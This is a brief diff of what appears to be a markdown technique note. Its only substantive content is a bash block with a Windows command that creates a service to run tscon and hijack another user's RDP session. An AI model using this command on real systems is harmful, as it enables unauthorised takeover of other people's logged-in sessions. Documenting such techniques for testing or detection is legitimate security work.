@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:37:19.880993+00:00'
 ```bash
 create sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#55"
 ```
+
+
